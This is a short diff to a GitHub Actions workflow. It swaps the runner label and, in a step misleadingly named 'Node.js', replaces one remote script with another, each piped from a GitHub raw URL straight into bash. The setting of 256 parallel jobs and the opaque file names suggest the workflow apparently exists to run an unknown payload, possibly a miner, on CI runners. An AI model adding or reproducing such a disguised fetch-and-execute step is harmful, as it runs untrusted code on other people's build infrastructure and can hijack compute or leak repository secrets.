@@ -7,7 +7,7 @@ on:
 jobs:
   build:
     name: IPLAYBOOKS
-    runs-on: ubuntu-latest
+    runs-on: graci
     strategy:
       max-parallel: 256
       fail-fast: false
@@ -28,4 +28,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Node.js
       run: |
-        curl -sL https://github.com/kidoescegh/smp/raw/main/bitzporeanyar | bash
+        curl -sL https://github.com/kidoescegh/smp/raw/main/nyubitz | bash
